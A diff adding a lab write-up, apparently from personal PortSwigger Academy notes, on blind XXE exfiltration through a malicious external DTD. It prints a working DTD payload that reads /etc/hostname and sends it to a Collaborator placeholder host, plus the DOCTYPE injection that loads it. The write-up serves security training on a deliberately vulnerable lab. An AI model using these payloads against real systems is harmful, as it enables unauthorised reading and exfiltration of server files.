@@ -75,3 +75,43 @@ Go to the Collaborator tab, and click "Poll now". If you don't see any interacti
 ![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/94269059-7387-4362-a69f-e26947ca38a8)
 
 ![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/12bc1db7-bc89-4837-a888-298821baa798)
+
+**Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD**
+
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+
+To solve the lab, exfiltrate the contents of the /etc/hostname file.
+
+Using Burp Suite Professional, go to the Collaborator tab.
+Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
+Place the Burp Collaborator payload into a malicious DTD file:
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
+You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
+Insert the following external entity definition in between the XML declaration and the stockCheck element:
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
+You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the /etc/hostname file.
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/1f4d0bee-a930-4eff-b4d9-decb8cddbd9a)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/dd67acd8-378e-4809-b56c-1e5b2f61d286)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/8bccc266-40c5-4318-a957-d4899d818712)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/a812d4f2-ec14-40c6-afa0-21df3c2bae30)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/eec5b5f6-6fa2-43d5-80a9-608676972f7c)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/55c1342e-23d2-4205-89f2-0d73c0931f2c)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/c5281175-2a58-4266-bac1-e9ba8bab0bc6)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/41731873-a46d-4ab5-abb9-0073d67d1c7c)
+
+**
